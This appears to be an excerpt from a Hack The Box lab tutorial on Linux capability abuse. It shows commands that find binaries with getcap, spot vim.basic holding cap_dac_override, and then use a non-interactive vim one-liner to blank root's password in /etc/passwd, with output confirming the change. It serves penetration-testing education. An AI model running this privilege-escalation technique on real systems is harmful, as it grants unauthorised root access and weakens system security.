...
EssMack90@htb[/htb]`$ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic`
...
EssMack90@htb[/htb]`$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;  /usr/bin/vim.basic cap_dac_override=eip /usr/bin/ping cap_net_raw=ep /usr/bin/mtr-packet cap_net_raw=ep`
...
EssMack90@htb[/htb]`$ getcap /usr/bin/vim.basic  /usr/bin/vim.basic cap_dac_override=eip`
...
EssMack90@htb[/htb]`$ cat /etc/passwd | head -n1  root:x:0:0:root:/root:/bin/bash`

We can use the `cap_dac_override` capability of the `/usr/bin/vim` binary to modify a system file:

EssMack90@htb[/htb]`$ /usr/bin/vim.basic /etc/passwd`

We also can make these changes in a non-interactive mode:

EssMack90@htb[/htb]`$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd $ cat /etc/passwd | head -n1  root::0:0:root:/root:/bin/bash`
